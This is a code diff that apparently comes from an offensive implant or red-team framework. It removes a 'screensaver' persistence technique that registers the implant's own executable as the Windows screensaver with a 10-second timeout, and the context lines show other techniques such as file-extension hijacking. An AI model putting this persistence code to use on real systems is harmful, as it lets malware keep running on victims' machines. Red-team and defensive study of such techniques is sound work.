@@ -88,68 +88,6 @@ namespace Task
                 return L"Error: Failed to set value to registry.";
             }
         }
-        else if (wcscmp(wTechnique.c_str(), L"screensaver") == 0)
-        {
-            // Reference: https://cocomelonc.github.io/tutorial/2022/04/26/malware-pers-2.html
-            HKEY hKey;
-            std::wstring wSubKey = L"Control Panel\\Desktop";
-            const WCHAR* wActivate = L"1"; // 1 => Activate
-            const WCHAR* wTimeOut = L"10";
-
-            if (pState->pProcs->lpRegOpenKeyExW(
-                HKEY_CURRENT_USER,
-                wSubKey.c_str(),
-                0,
-                KEY_WRITE,
-                &hKey
-            ) != ERROR_SUCCESS)
-            {
-                return L"Error: Failed to open key.";
-            }
-        
-            // Create new registry keys.
-            if (pState->pProcs->lpRegSetValueExW(
-                hKey,
-                L"ScreenSaveActive",
-                0,
-                REG_SZ,
-                (BYTE*)wActivate,
-                (wcslen(wActivate) + 1) * sizeof(WCHAR)
-            ) != ERROR_SUCCESS)
-            {
-                pState->pProcs->lpRegCloseKey(hKey);
-                return L"Error: Failed to set value to registry.";
-            }
-
-            if (pState->pProcs->lpRegSetValueExW(
-                hKey,
-                L"ScreenSaveTimeOut",
-                0,
-                REG_SZ,
-                (BYTE*)wTimeOut,
-                (wcslen(wTimeOut) + 1) * sizeof(WCHAR)
-            ) != ERROR_SUCCESS)
-            {
-                pState->pProcs->lpRegCloseKey(hKey);
-                return L"Error: Failed to set value to registry.";
-            }
-
-            if (pState->pProcs->lpRegSetValueExW(
-                hKey,
-                L"SCRNSAVE.EXE",
-                0,
-                REG_SZ,
-                (BYTE*)wSelfPath,
-                (wcslen(wSelfPath) + 1) * sizeof(WCHAR)
-            ) != ERROR_SUCCESS)
-            {
-                pState->pProcs->lpRegCloseKey(hKey);
-                return L"Error: Failed to set value to registry.";
-            }
-
-            pState->pProcs->lpRegCloseKey(hKey);
-            return L"Success: The entry has been set to HKCU\\" + wSubKey + L".";
-        }
         else if (wcscmp(wTechnique.c_str(), L"default-file-extension-hijacking") == 0)
         {
             HKEY hKey;
